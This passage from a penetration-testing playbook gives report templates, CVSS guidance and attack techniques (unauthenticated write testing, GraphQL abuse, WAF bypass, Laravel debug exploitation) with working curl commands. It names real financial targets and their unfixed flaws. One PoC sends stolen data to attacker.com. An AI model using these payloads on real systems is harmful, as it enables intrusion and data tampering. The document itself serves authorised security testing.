| F-1 | {title} | Critical | microservices.prod.bravo.bfi.co.id | ❌ Unfixed | Still returns 200 |

### Key Observations

- {Pattern observation, e.g., "Fixes applied to 1 of 4 gateways only"}
- {Root cause, e.g., "Configuration drift between gateway variants"}
- {Positive note if any, e.g., "JWT validation logic properly implemented on primary gateway"}
```

**Modified Executive Summary:**
```markdown
## 1. Executive Summary

### Remediation Status
- **{n}/{total} findings fixed** from Round 1 ({%} remediation rate)
- **{n} new findings** discovered in Round 2
- **{total} active vulnerabilities** across the estate

### Key Findings (combine old + new)

| Category | Count |
|----------|-------|
| Unfixed Critical (Round 1) | {n} |
| Unfixed High (Round 1) | {n} |
| New Critical (Round 2) | {n} |
| New High (Round 2) | {n} |
| **Total Active** | **{n}** |
```

**Modified Findings Summary (Section 4):**
```markdown
## 4. Findings Summary

### Unfixed Round 1 Findings

| R1 ID | Title | Severity | Status | Notes |
|-------|-------|----------|--------|-------|
| F-1 | {title} | Critical | ❌ Still vulnerable | {brief note} |

**Summary: {n}/{total} fixed. {n} partially fixed. {n} still vulnerable.**

### New Findings (Round 2)

| ID | Title | Severity | CVSS | Asset |
|----|-------|----------|------|-------|
| F-1 | {title} | Critical | 9.1 | {asset} |
```

**Additional Appendix:**
```markdown
## Appendix: Fix Verification Details

For each Round 1 finding, document:
1. Original PoC replayed verbatim
2. All gateways/paths tested (not just the primary)
3. Adjacent endpoints checked
4. Current response vs Round 1 response

| R1 Finding | Test Performed | Expected (if fixed) | Actual | Verdict |
|-----------|---------------|---------------------|--------|---------|
| F-1 GET | curl -sk $URL/master/v1/general | 401 | 200 (4199 records) | UNFIXED |
| F-1 POST | curl -sk -X POST $URL/master/v1/general -d '...' | 401 | 200 (created ID 5668) | UNFIXED |
```

**Framing guidance for reassessments:**
- Lead with remediation effectiveness — this is what stakeholders care about most
- Frame unfixed findings as "remediation failure" not just "vulnerability exists"
- Highlight patterns (e.g., "all fixes applied to one gateway only" = systemic deployment issue)
- Note positive progress even if incomplete (e.g., "primary gateway secured, parallel paths missed")
- Include a "Remediation Process Recommendations" section addressing WHY fixes failed, not just WHAT to fix
- Calculate risk delta: is the organization MORE or LESS secure than Round 1? (can be worse if new findings outweigh fixes)

### CVSS Scoring Guidance for Financial Services

For targets in financial services (banking, multi-finance, insurance), consider upgrading severity when:

| Factor | Adjustment |
|--------|-----------|
| Exposed data enables fraud (credit scoring rules, approval thresholds) | +0.5–1.0 to base score |
| Regulatory violation (OJK, PBI, PCI-DSS, SOX) | Upgrade to next severity tier |
| Scope change (compromised service can access other services) | Use S:C (Changed) in CVSS vector |
| Data volume > 1000 records of business logic | Consider Critical even without PII |

**Key principle:** Business logic data (credit rules, approval hierarchies, risk matrices) can be MORE damaging than PII for financial institutions — it enables systematic fraud rather than individual identity theft.

### Regulatory Context (add to report when applicable)

| Country | Regulator | Relevant Rules |
|---------|-----------|---------------|
| Indonesia | OJK (Otoritas Jasa Keuangan) | POJK 11/2022 on IT risk management |
| Indonesia | Bank Indonesia | PBI on payment system security |
| Global | PCI-DSS | If payment card data in scope |
| US | SOX, GLBA | If US-listed or US operations |
| EU | GDPR, DORA | If EU customers or operations |

---

## Phase 6: Exploitation — Structured Framework

**Full framework:** See `references/phase6-exploitation-framework.md` for:
- Mandatory checklist with scope-aware technique matrix (12 techniques)
- Decision tree for exploitation flow (what to do after each technique)
- Time budgets per technique
- Exit criteria for gateway transition
- RE-ENUM trigger (re-validation loops when new access opens new surface)

**Credential inventory:** See `references/credential-inventory-structure.md` for:
- Centralized tracking of all discovered credentials
- Cross-environment validation matrix
- Chain tracking and documentation

**Attack chains:** See `references/attack-chain-framework.md` for:
- Identifying and documenting compound attack paths
- Chain severity scoring (beyond individual CVSS)
- Presentation format for reports
- Common chain patterns in financial services

**Re-validation loops:** See `references/re-validation-loops.md` for:
- When to trigger mini-enumeration during exploitation
- 15-minute time-boxed procedure
- Integration with Phase 6 checklist and attack chains

### HTTP Method Testing on Unauthenticated Endpoints (MANDATORY)

**When you find an unauthenticated GET endpoint, ALWAYS test other HTTP methods.** This is the single highest-ROI exploitation technique for API-focused engagements.

```bash
# For every unauthenticated endpoint discovered in Phase 3/5:
for method in POST PUT PATCH DELETE OPTIONS; do
  curl -sk -X $method -w " [%{http_code}]" "$ENDPOINT" \
    -H "Content-Type: application/json" -d '{"name":"pentest-probe","code":"PT"}'
done
```

**Interpretation:**
- 200/201 on POST → **CRITICAL: unauthenticated record creation**
- 200 on PATCH/PUT → **CRITICAL: unauthenticated data modification**
- 200 on DELETE → **CRITICAL: unauthenticated data destruction**
- 405 Method Not Allowed → safe (method explicitly blocked)
- 401/403 → safe (auth enforced per-method)
- 500 → ambiguous (may be unimplemented OR may be a payload format issue — try different bodies)

**Why this matters:** Many Spring Boot APIs use `@GetMapping` without auth but forget that the same controller may have `@PostMapping`/`@PatchMapping` that also lacks auth. The WAF/gateway may only enforce auth on specific paths, not methods.

**Real-world example (BFI Finance, May 2026):**
- `/master/v1/general` GET returned 4,199 records without auth (reported as High — read-only)
- Testing POST created a new record: `{"id":5661,"name":"test","code":"TEST"}` — no auth required
- Testing PATCH modified record #1 (production credit scoring rule) — no auth required
- Finding upgraded from High (7.5) to **Critical (9.1)** — unauthenticated write on production financial data
- Attack chain: modify NST approval thresholds → fraudulent loans auto-approved → revert to hide evidence

**Checklist (add to Phase 6 technique 6.5):**
- [ ] Test POST on all unauthenticated GET endpoints
- [ ] Test PATCH on all unauthenticated GET endpoints with `/{id}` suffix
- [ ] Test PUT on all unauthenticated GET endpoints with `/{id}` suffix
- [ ] Test DELETE on all unauthenticated GET endpoints with `/{id}` suffix
- [ ] If write succeeds: follow Write Access Response Protocol below

### Write Access Response Protocol

When write access (POST/PUT/PATCH/DELETE) succeeds on an unauthenticated endpoint, follow this decision tree:

```
Write Access Confirmed
├── Is this PRODUCTION?
│   ├── YES → Minimize impact. ONE record is sufficient proof.
│   │   ├── Use obviously-fake data: {"name":"PENTEST-PROBE-DELETE","code":"PT-DELETE"}
│   │   ├── Do NOT test PATCH/PUT on existing records (risk of corrupting real data)
│   │   ├── Prove PATCH exists without corrupting: test on the record YOU just created
│   │   └── Document record ID immediately for client cleanup
│   └── NO (nonprod) → More latitude, but still document for cleanup
│
├── Can you DELETE the test record?
│   ├── YES → Delete immediately, screenshot before/after as evidence
│   └── NO (no DELETE endpoint or DELETE returns 405/403)
│       ├── Can you PATCH it to a flagged state?
│       │   ├── YES → PATCH name to "PENTEST-DELETE-ME-{date}" so client can find it
│       │   └── NO → Leave as-is, document in cleanup appendix
│       └── Add to "Test Records Created" cleanup table
│
├── Is the write DESTRUCTIVE? (overwrites/deletes existing data)
│   ├── YES → DO NOT EXECUTE on real records
│   │   ├── Prove the method is accepted: send request with empty/malformed body
│   │   ├── Document: "PUT /resource/1 returns 400 (bad body) not 401/405 — write method accepted"
│   │   ├── Or: test on YOUR created record only
│   │   └── This is sufficient evidence without corrupting production data
│   └── NO (creates new record) → Safe to execute once as proof
│
└── Documentation requirements:
    ├── Screenshot/save the response showing successful write
    ├── Record the exact ID/key of created records
    ├── Add to report "Appendix: Test Records (Client Cleanup Required)"
    ├── Format: | Environment | Endpoint | Record ID | Data Written | Action Needed |
    └── Notify client in debrief that cleanup is needed
```

**Test payload conventions:**
- Always use obviously-fake data that's easy to find and delete
- Include "PENTEST" or "DELETE-ME" in the name/description field
- Use code/identifier like "PT-{date}" (e.g., "PT-20260521")
- Never use real-looking data that could be confused with legitimate records
- Never write offensive/inappropriate content (it's production)

**Proving write without writing (when risk is too high):**
```bash
# Method 1: OPTIONS check
curl -sk -X OPTIONS "$ENDPOINT" -D- | grep "Allow:"
# If Allow: GET, POST, PUT, DELETE → methods accepted

# Method 2: Empty body (triggers 400, not 401/405)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/json" -d '{}' -w "[%{http_code}]"
# 400 = endpoint accepts POST but body is invalid (PROVES write access exists)
# 401/403 = auth required (safe)
# 405 = method not allowed (safe)

# Method 3: Invalid content-type (triggers 415, not 401)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: text/plain" -d 'test' -w "[%{http_code}]"
# 415 = Unsupported Media Type (PROVES endpoint processes POST requests)
```

**Cleanup appendix format (add to report):**
```markdown
## Appendix: Test Records Created (Client Cleanup Required)

| # | Environment | Endpoint | Record ID | Data Written | Date | Action |
|---|-------------|----------|-----------|-------------|------|--------|
| 1 | PROD | /master/v1/general | 5668 | {"name":"PENTEST-PROBE","code":"PT"} | 2026-05-21 | DELETE |
| 2 | SIT | /master/v1/general | 8078 | {"name":"PENTEST-PROBE","code":"PT"} | 2026-05-21 | DELETE |
```

### Fix Verification (Redo/Reassessment Engagements)

When redoing a pentest or reassessing previously reported findings:

1. **Test ALL gateways/paths to the same backend** — a fix applied to one gateway (e.g., `microservices.prod.bfi.co.id`) may NOT be applied to another gateway routing to the same service (e.g., `microservices.prod.bravo.bfi.co.id`). In the BFI redo, F-1 was "fixed" on one gateway but the Bravo gateway remained fully vulnerable.
2. **Test the exact same PoC** — don't assume the fix works. Replay the original exploit steps verbatim.
3. **Test adjacent endpoints** — if `/master/v1/general` was fixed, check `/master/v1/address/province`, `/master/v1/bank`, etc.
4. **Document fix status per gateway:**
   ```markdown
   | Gateway | Endpoint | Previous Status | Current Status |
   |---------|----------|----------------|----------------|
   | microservices.prod.bfi.co.id | /master/v1/general | Vuln (GET/POST/PATCH) | Fixed (401) |
   | microservices.prod.bravo.bfi.co.id | /master/v1/general | Vuln (GET/POST/PATCH) | STILL VULNERABLE |
   ```
5. **Incomplete fixes are findings** — document as "Incomplete Remediation" with reference to the original finding ID. Severity remains the same (or higher if the incomplete fix creates false confidence).

### Credential Chaining & Cross-Environment Pivoting

**Full reference:** See `references/credential-chaining.md` and `references/credential-inventory-structure.md` for:
- Discovery → Validation → Escalation → Lateral Movement workflow
- Cross-environment pivot paths (mock heapdump → prod access)
- Credential inventory tracking and chain documentation

**Key principle:** Lower environments are often less protected but share credentials with production. A heapdump from mock can yield prod access.

### JWT Attack Techniques (Full Reference)

**Full reference:** See `references/jwt-attack-techniques.md` for:
- Decision tree (what to try based on what you have)
- 12-technique checklist with priority order
- Signature bypass (alg:none, unverified signatures)
- Header injection (jwk, jku, kid traversal, kid SQLi, x5c)
- Algorithm confusion (RS256→HS256 with public key)
- Secret brute-force (hashcat, jwt_tool, custom Python)
- Token endpoint abuse (Keycloak public clients, device code, CIBA)
- Post-exploitation with forged tokens

### Token Exchange & Authentication Bypass

**Full reference:** See `references/keycloak-assessment.md` and `references/oauth-sso-attack-chains.md` (Keycloak-Specific Chains) for:
- Public client identification and enumeration
- Password grant vs client credentials grant
- Token introspection and exchange
- Service account escalation and impersonation

### CORS Origin Reflection Testing (MANDATORY Phase 5)

**WordPress headless CMS pattern:** See `references/wordpress-headless-cors.md` for:
- Detection of headless WP setups (rae/v1 namespace, X-Headless-CMS header)
- REST API vs GraphQL CORS differences (often different policies on same host)
- Exploitation with credentials:include (cookie-based session theft)
- Stack trace disclosure via broken WooCommerce dependency
- Severity assessment matrix

- `references/google-pitchfork-testing.md` for Google Pitchfork framework RPC testing (batchexecute endpoint, AT token, RPC discovery, CSRF/IDOR, WIZ_global_data fields, nflpzd is NOT a vuln)
- `references/google-maps-ssrf-kml.md` for SSRF via KML import in Google My Maps (NetworkLink, Icon href, GroundOverlay, callback setup)
- `references/oauth-sso-attack-chains.md` (Chain 3: CORS Misconfiguration) for:
- Complete origin test payloads and rationale (7 bypass variants)
- Interpretation guide (ACAO + ACAC combinations → severity)
- Exploitation PoC templates (XHR, sandboxed iframe, XSS chain)
- Key targets and reporting guidance for financial services

**Minimum checklist:** Test ALL auth endpoints with `Origin: https://evil.com` + check for `Access-Control-Allow-Credentials: true`. If reflected → Critical. Load full reference for bypass variants and PoC templates.

### GraphQL API Testing (MANDATORY when GraphQL detected)

**Detection:** Check `/graphql`, `/api/graphql`, `/v1/graphql` — look for GraphiQL UI or `{"errors":[{"message":"..."}]}` responses.

**Checklist (in order of ROI):**

1. **Introspection** — schema dump reveals full attack surface:
   ```bash
   curl -s https://target.com/graphql -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
   ```
   If enabled: extract all mutations, identify which require auth vs don't.

2. **Unauthenticated mutations** — test EVERY mutation without auth headers:
   ```bash
   # For each mutation discovered via introspection:
   curl -s https://target.com/graphql -H "Content-Type: application/json" \
     -d '{"query":"mutation { mutationName(arg: \"test\") { result } }"}'
   ```
   If response is data (not auth error) → High finding (missing auth on write operation).

3. **Alias-based batching** — amplifies any unauth mutation:
   ```bash
   curl -s https://target.com/graphql -H "Content-Type: application/json" \
     -d '{"query":"mutation { a: upload(x:\"1\") { id } b: upload(x:\"2\") { id } c: upload(x:\"3\") { id } }"}'
   ```
   If all aliases execute → no per-request mutation limit. Combined with no rate limiting = resource abuse.

4. **Array batching** — alternative amplification:
   ```bash
   curl -s https://target.com/graphql -H "Content-Type: application/json" \
     -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]'
   ```
   Often disabled ("Batching is not enabled") but alias batching still works.

5. **CORS on GraphQL endpoint** — test separately from main app:
   ```bash
   curl -sI -H "Origin: https://evil.com" -X OPTIONS \
     -H "Access-Control-Request-Method: POST" https://target.com/graphql
   ```

6. **Sensitive data in queries** — check for PII exposure (email, phone) in user/profile queries without auth.

7. **Subscription abuse** — WebSocket subscriptions may bypass auth:
   ```bash
   wscat -c wss://target.com/graphql -x '{"type":"connection_init","payload":{}}'
   ```

**Key insight:** DeFi/fintech devs often assume "wallet signature = auth" and leave GraphQL mutations unprotected server-side. Always test mutations without ANY auth header first.

### Signature-Based Authentication Testing (when wallet/crypto signatures used)

**Detection:** Look for mutations/endpoints requiring `signature`, `message`, `nonce` parameters. Common in Web3 but also in fintech (document signing, API key auth).

**Checklist:**

1. **Timestamp expiry** — sign with old timestamp (years ago) → still accepted?
   ```bash
   # If message format is "Timestamp: <unix>", try timestamp from 2020
   # Accepted = no expiry enforcement → replay window is infinite
   ```

2. **Replay protection** — reuse same signature with different action params:
   ```bash
   # Call 1: signature X + email "legit@user.com" → success
   # Call 2: signature X + email "attacker@evil.com" → success?
   # If yes: no nonce/one-time-use enforcement
   ```

3. **Parameter binding** — is the action (email, amount, recipient) included in the signed message?
   ```
   # If signed message is just "Timestamp: 1716000000" but the mutation
   # also accepts emailAddress as a SEPARATE parameter → email is unbound
   # One signature can set ANY email = blank check
   ```

4. **Message format strictness** — does it require exact format or just "contains keyword"?
   ```bash
   # Try: "Random text Timestamp: 1716000000 more text" → accepted?
   # If yes: cross-protocol signature reuse possible
   ```

5. **Future timestamps** — sign with far-future timestamp → accepted?

6. **Wrong signer** — confirm crypto validation actually works (sanity check):
   ```bash
   # Use invalid/zero signature → should get "invalid signature" error
   # This proves the server DOES verify — it just lacks temporal/replay checks
   ```

**Severity mapping:**
- No expiry alone → Medium (bounded replay if signature intercepted)
- No replay + no expiry → High (unlimited reuse forever)
- No binding + no replay + no expiry → High (permanent irrevocable takeover, victim cannot self-remediate)

**Compare against EIP-4361 (SIWE) standard:** domain binding, nonce, expiration, statement, chain ID. Any missing element is a finding.

### OAuth/OIDC redirect_uri Validation Testing (MANDATORY Phase 5/6)

**Full reference:** See `references/oauth-sso-attack-chains.md` for:
- Complete redirect_uri bypass payloads (8 variants including parse differentials)
- Client enumeration methodology (defaults + JS bundle extraction)
- PKCE enforcement check (determines if stolen code is usable)
- Full attack chain documentation (phishing URL → code theft → token exchange → ATO)
- Keycloak-specific chains (admin-cli, realm confusion, service account escalation)
- Severity guidance (public client + no PKCE + open redirect = Critical 8.1+)

**Minimum checklist:**
- [ ] Discover all OAuth/OIDC authorization endpoints (.well-known)
- [ ] Enumerate all client_ids (defaults + JS bundle extraction)
- [ ] Test arbitrary redirect_uri on each client
- [ ] If accepted: confirm public client + no PKCE
- [ ] Document full attack chain with PoC URL

### Web Testing Checklist Cross-Reference (Phase 5/6)

**Full reference:** See `references/web-testing-checklist.md` for:
- User management testing (registration, auth, session, password reset) — 50+ test cases
- Application logic flaws (price tampering, workflow bypass, CAPTCHA bypass)
- Input handling injection points (priority order by location)
- Security headers audit checklist
- Infrastructure quick checks (.git, .env, backup files, zone transfer)

**When to use:** After automated scanning in Phase 5, cross-check this list to ensure no common test case was missed. During Phase 6 techniques 6.2 (Auth Bypass), 6.5 (Business Logic), and 6.6 (Access Control), use the relevant sections as a systematic guide.

### Unauthenticated Integration/Callback Endpoint Testing (MANDATORY Phase 3/6)

When actuator metrics or error messages reveal `/integration/*`, `/callback`, or `/webhook` paths, test them WITHOUT authentication. These endpoints are designed to receive calls from partner services (GoPay, payment gateways, KYC providers) and often lack auth by design — but this is a vulnerability when internet-facing.

**Discovery technique:**
1. Check actuator metrics URI tags for `/integration/*` or `/callback` paths
2. Check error messages for internal routing (e.g., `executing POST http://internal-service/path`)
3. Try POST with empty JSON body `{}` — look for 400 (parameter validation) vs 401 (auth required)
4. If 400/500 returned (not 401): endpoint processes requests without auth

**Key insight (Findaya, May 2026):**
- `/integration/gopay/kyc/v1/{id}/callback` — no auth, 500 error leaked internal service name + domain
- `/legalEntityKYC/v1/onboarding-doc` — no auth, returned signed GCS URLs to production KYC documents (Critical)
- `/v1/user/progressive-kyc/callback` — no auth, 500 (processes request)
- Pattern: callback/integration endpoints bypass auth middleware because they're meant for server-to-server calls

**Checklist:**
- [ ] Identify all `/integration/*`, `/**/callback`, `/webhook/*` paths from metrics/errors/JS bundles
- [ ] Test each with POST + empty body (no auth header)
- [ ] If response is NOT 401/403: document as unauthenticated endpoint
- [ ] Check if response contains sensitive data (signed URLs, user records, status changes)
- [ ] Test with crafted payloads to assess impact (can you approve KYC? change status? trigger actions?)

### OTP/2FA Endpoint Testing (MANDATORY when OTP endpoints exist)

**Full reference:** See `references/otp-endpoint-testing.md` for:
- Rate limit bypass via purpose/type rotation (OTP flooding)
- User enumeration via forgot_password response differentiation
- Email header injection in OTP email fields
- Phone number parameter discovery
- Timing-based user enumeration

**Key insight:** OTP endpoints are almost always unauthenticated (they're the pre-auth step). They're quick wins (5-10 minutes) that produce Medium-severity findings even without an account. Test these BEFORE declaring "unauthenticated testing exhausted."

**Discovery technique (GoBiz pattern, May 2026):** When the API requires custom headers you can't guess, use browser fetch interception:
```javascript
// Inject in browser console BEFORE triggering the action
const originalFetch = window.fetch;
window._capturedRequests = [];
window.fetch = function(...args) {
  const [url, options] = args;
  if (url && url.toString().includes('TARGET_KEYWORD')) {
    window._capturedRequests.push({
      url: url.toString(),
      method: options?.method,
      headers: options?.headers ? Object.fromEntries(
        options.headers instanceof Headers ? options.headers.entries() : Object.entries(options.headers)
      ) : null,
      body: options?.body
    });
  }
  return originalFetch.apply(this, args);
};
```
Then trigger the action in the UI and read `window._capturedRequests`. This reveals required custom headers (e.g., `X-User-Type`, `x-appId`, `Authentication-Type`, `Gojek-Country-Code`) that aren't discoverable from JS source alone.

**Minimum checklist:**
- [ ] Enumerate OTP-related endpoints (send_otp, resend_otp, verify_otp, forgot_password)
- [ ] Test rate limiting per-endpoint
- [ ] Test rate limit bypass via purpose/type rotation
- [ ] Test rate limit bypass via token rotation (request new OTP token → get fresh attempts)
- [ ] Test user enumeration via response differentiation (email AND phone flows separately)
- [ ] Test OTP to arbitrary recipients (spam/flooding potential)
- [ ] Document OTP length and validity window (4-digit + 12min = weak; 6-digit + 5min = acceptable)
- [ ] Check if rate limit is per-IP, per-account, or per-token (per-token is weakest)

### WAF/Ingress Bypass Techniques (Conditional)

When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:

| Technique | Example | Success Indicator |
|-----------|---------|-------------------|
| Case variation | `/Actuator/Health`, `/ACTUATOR/HEALTH` | 403→401 or 403→200 |
| Semicolon path param | `/actuator;.js/health` | 403→200 |
| Tomcat path normalization | `/service/..;/actuator/health` | 403→302→target |
| URL encoding | `/%61ctuator/health` | 403→200 |
| Double URL encoding | `/%2561ctuator/health` | 403→200 |
| HTTP method override | `X-HTTP-Method-Override: GET` on POST | Different response |
| Host header injection | `Host: localhost` | Bypass IP-based rules |
| X-Forwarded-For | `X-Forwarded-For: 127.0.0.1` | Bypass IP allowlist |
| Path addition | `/actuator/health.json`, `/actuator/health/` | Bypass exact-match rules |
| HTTP/1.0 downgrade | `--http1.0` flag | Bypass HTTP/2-only rules |

**Document bypass as a finding** even if you can't get past the application auth layer behind it. WAF bypass + application auth = defense-in-depth failure.

### Source Map → Token Exploitation Chain (Phase 1/3/6)

**Full reference:** See `references/source-map-token-exploitation.md` for:
- Multi-app source map sweep methodology (MANDATORY once one is found)
- 3-step exploitation chain: source map → auth pattern → token extraction → verified write access
- Telemetry/clickstream token exploitation (Grafana Faro, Raccoon, Segment)
- CORS + Debug Mode = cross-origin architecture extraction (combined severity upgrade)
- CMS API route discovery pattern (check production site HTML for correct URL format)
- Flutter Web / Protobuf bundle analysis
- Severity matrix and bug bounty submission strategy

**Minimum checklist (add to Phase 3 technique 3.7 — JavaScript Secret Scanning):**
- [ ] For each live web app: check `main.*.js.map`, `app.*.js.map`, `*-protos*.js.map`
- [ ] If source map found: extract auth patterns (Authorization, Bearer, Basic, X-API-Key)
- [ ] Extract tokens from minified JS using discovered env var names
- [ ] Verify token write access (POST with empty body → 200 vs 401)
- [ ] If one app has source maps: check ALL other apps on same infrastructure
- [ ] Document: token value, decoded value, endpoint, HTTP response code

**Key insight (GoPay, May 2026):** Source maps on 2 production apps revealed 3 clickstream tokens all granting write access to the same event pipeline. The source map turned a buried token in 400KB of minified JS into a 3-command exploit chain. Always check staging apps too — they often have MORE verbose config (NRAK user API keys, internal URLs, client credentials).

### Laravel Debug Mode Detection & Exploitation

When Laravel applications are found (detected via: Symfony exception format in JSON responses, `/vendor` 301, `/horizon` 302, cookie names like `XSRF-TOKEN` with Laravel encryption format):

**Detection signals:**
- JSON 404 responses with `"exception"`, `"file"`, `"line"`, `"trace"` keys
- Different response sizes for routes that hit middleware vs routes that don't exist at all
- Cookie: `XSRF-TOKEN=eyJ...` (base64 JSON with `iv`, `value`, `mac`, `tag` structure)

**What debug mode reveals:**
- Application path (e.g., `/var/www/gopay-backend/`)
- Model names (e.g., `App\Models\Article`) → reveals database table structure
- Middleware chain → reveals auth/locale/cache layers
- Vendor packages → reveals dependencies for CVE mapping
- Route binding patterns → reveals valid URL structures

**Exploitation steps:**
1. Identify routes that hit application middleware (different stack trace = route exists)
2. Differentiate: `NotFoundHttpException` from Router (route doesn't exist) vs `ModelNotFoundException` (route exists, record doesn't)
3. Use ModelNotFoundException messages to enumerate valid route patterns: `/api/v1/{resource}/{id}`
4. Try numeric IDs, UUIDs, and slug patterns on confirmed routes
5. Check if any routes return data without authentication

**Severity:** Medium-High for production financial apps. Debug mode exposes internal architecture that aids further attacks. Combined with other findings (exposed admin panels, staging environments), it demonstrates systemic configuration management failure.

**Common co-findings on Laravel apps:**
- `/horizon` → Laravel Horizon queue dashboard (often behind auth but confirms Laravel)
- `/.env` → 403 means file exists (try nginx bypass: `/.env%00`, `/..;/.env`, path traversal)
- `/telescope` → Laravel Telescope debug dashboard
- `/api/v1/{resource}/{locale}` → AcceptLocale middleware pattern (locale as URL segment)
- `/api/{locale}/{resource}` → Alternative locale-as-path pattern (GoPay CMS uses this)

**Debug Mode + CORS Wildcard Chain (GoPay, May 2026):**

When `APP_DEBUG=true` is combined with `Access-Control-Allow-Origin: *`, any website can extract internal architecture cross-origin. This is NOT just info disclosure — it's exploitable:

1. Debug mode exposes stack traces with file paths, models, middleware, dependencies
2. CORS `*` allows any origin to read these responses via JavaScript
3. Spatie QueryBuilder errors reveal ALL database columns: `?sort=INVALID` → "Allowed sort(s) are `id, title, ...`"
4. ModelNotFoundException reveals table/model names: `/api/id/articles/99999` → "No query results for model [App\Models\Article]"

**Exploitation PoC pattern:**
```javascript
// Any malicious website can extract this cross-origin
fetch('https://cms-target.com/api/v1/nonexistent', {
    headers: {'Accept': 'application/json'}
})
.then(r => r.json())
.then(data => {
    // data.file = "/var/www/backend/..."
    // data.trace = [{file: "...", line: N}, ...]
    // Full architecture extracted without auth
    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data));
});
```

**Finding the correct API path (when /api/v1/ returns 404):**
Check the production site's HTML source for API calls. The frontend often fetches from the CMS with the correct path pattern:
```bash
curl -sk "https://target.com/blog" | grep -oiE 'https?://[^"]*api[^"]*' | sort -u
# May reveal: http://cms-target.com/api/id/articles (locale as path segment!)
```

**Database schema enumeration via error messages:**
```bash
# Enumerate allowed sort columns (= database columns)
curl -sk "https://cms-target.com/api/{locale}/articles?sort=INVALID" -H "Accept: application/json"
# → "Allowed sort(s) are `id, title, slug, author, is_private, published_at, ...`"

# Enumerate allowed filters
curl -sk "https://cms-target.com/api/{locale}/articles?filter[INVALID]=x" -H "Accept: application/json"

# Enumerate allowed includes (relationships)
curl -sk "https://cms-target.com/api/{locale}/articles?include=INVALID" -H "Accept: application/json"
```

**CMS API Path Discovery (SuitCMS/Laravel pattern, GoPay May 2026):**

When debug traces reveal `AcceptLocale` middleware blocking `/api/v1/{resource}`, the actual API path is often `/api/{locale}/{resource}` (locale as path segment, NOT header). Discovery technique:

1. Check the production site's HTML source for API calls:
   ```bash
   curl -sk "https://target.com/blog" | grep -oiE 'https?://[^"]*api[^"]*' | sort -u
   ```
2. This reveals the correct URL pattern (e.g., `/api/id/articles` not `/api/v1/articles`)
3. Differentiate real routes from non-existent ones by response SIZE:
   - Size A (e.g., 11739) = route EXISTS but middleware rejects → try correct path format
   - Size B (e.g., 9042) = route does NOT exist at all
4. Once correct path found, enumerate all endpoints:
   ```bash
   for ep in articles categories menus faqs promos banners tags products teams careers; do
     curl -sk -o /dev/null -w "%{http_code}:%{size_download} $ep\n" \
       "https://cms.target.com/api/id/$ep" -H "Accept: application/json"
   done
   ```
5. Check `OPTIONS` to confirm read-only (`Allow: GET,HEAD`) vs read-write access

### GoTo/Gojek/GoBiz GoID Authentication Testing

**Full reference:** See `references/gojek-gobiz-auth-patterns.md` for:
- GoID endpoint structure (/goid/login/request, /goid/token)
- Required custom headers (X-User-Type, x-appId, Gojek-Country-Code, etc.)
- Login request payloads (email password, email OTP, phone OTP)
- Token exchange payloads (password, OTP, refresh)
- User enumeration response patterns (OTP flow differentiates, password flow doesn't)
- Rate limiting behavior (per-email, per-token, not per-IP)
- Environment config exposure via inline $_ENV in HTML

### Next.js Server-Side Proxy Pattern (SSR API Routes)

Modern web apps (Next.js, Nuxt, SvelteKit) often proxy API calls through their own server-side routes. The frontend calls `/goid/token` on the SAME origin, and the Next.js server adds session tokens, CSRF validation, captcha verification, and internal headers before forwarding to the real backend.

**Detection signals:**
- API endpoints on the same domain as the frontend (not a separate api.* subdomain)
- `x-nextjs-cache` header in responses
- JS bundle references paths like `/goid/token` with `credentials: "include"` (cookie-based)
- Server returns "missing field" errors even when you provide all visible fields (server adds hidden ones)
- CSRF cookies (csrfSecret + XSRF-TOKEN) required for API calls

**Implications for testing:**
1. You CANNOT replicate the full request externally — the server adds fields from its session store
2. The captcha token is consumed server-side and converted to a session flag — you can't skip it
3. Browser-based testing is the ONLY way to trigger these flows (fetch interception)
4. Non-prod environments may have the same proxy but with relaxed WAF — test there first
5. The `/goid/token` endpoint may pass through without full proxy validation (refresh tokens don't need captcha)

**Testing strategy:**
- Use browser fetch interception to capture the FULL request (headers + body + cookies)
- If captcha blocks browser automation, document as blocker and assess close-out
- Focus on endpoints that bypass the proxy (direct backend access via gojekapi.com)
- Test grant_type variations on /goid/token (refresh_token, client_credentials) — these may not require captcha

**GoFood-specific patterns (May 2026):**
- Consumer web uses `x-user-type: customer` (vs `merchant` for GoBiz)
- Client ID: `gofood-web` (proxy-only, not registered on direct GoID API)
- Additional endpoints: `/v6/customers/newrequest`, `/v6/customers/phone/verify`, `/v6/customers/register`
- Field name difference: `phone` (with +62 prefix) vs GoBiz's `phone_number` + `country_code`
- `/v2/otp/retry` accepts `otp_token` field — validates token expiry without captcha
- 49 reCAPTCHA elements detected in login modal — heavy captcha protection
- Headers from JS: `x-user-type`, `x-user-locale`, `gojek-country-code`, `gojek-timezone`, `x-location`, `x-uniqueId`, `x-platform`, `x-appversion`, `gojek-service-area`, `gojek-service-type`, `x-captcha-token`, `x-captcha-appid`

### Alibaba Cloud WAF (aliyunwaf) Behavior Patterns

When testing targets behind Alibaba Cloud WAF (Tengine):

| Behavior | Indicator |
|----------|-----------|
| WAF presence | CNAME to `*.aliyunwaf2.com` or `*.aliyunwaf3.com` |
| Session tracking | `acw_tc` cookie (HttpOnly, 30min Max-Age) |
| WAF block (405) | HTML page with Chinese/English "request has been blocked" + traceid |
| WAF block (403) | Alibaba CDN error page with `errors.aliyun.com` images |
| Server header | `Tengine` (Alibaba's nginx fork) |
| NLB pattern | CNAME to `nlb-*.ap-southeast-5.nlb.aliyuncsslbintl.com` (Jakarta region) |
| Istio behind WAF | `server: istio-envoy` + `acw_tc` cookie = WAF → Istio mesh |

**WAF rules observed (Findaya, May 2026):**
- Blocks `/actuator/prometheus` with 405 (WAF rule on metrics endpoint)
- Does NOT block `/actuator`, `/actuator/health`, `/actuator/metrics`, `/actuator/info` — partial rule
- Blocks common attack paths (`.env`, `.git`, path traversal) with 405 block page
- `acw_tc` cookie set on every response (session tracking, not auth)
- NLB distributes to multiple IPs (round-robin)

**Key difference from Tencent WAF:**
- Alibaba WAF uses 405 status (not 403) for blocked requests
- Block page includes `traceid` in a hidden textarea (useful for support escalation, not exploitable)
- Alibaba WAF + Istio is a common pattern in GoTo/Gojek infrastructure (Jakarta region)

**Bypass attempts that FAILED:**
- All standard path normalization tricks (..;/, %2f, double encoding)
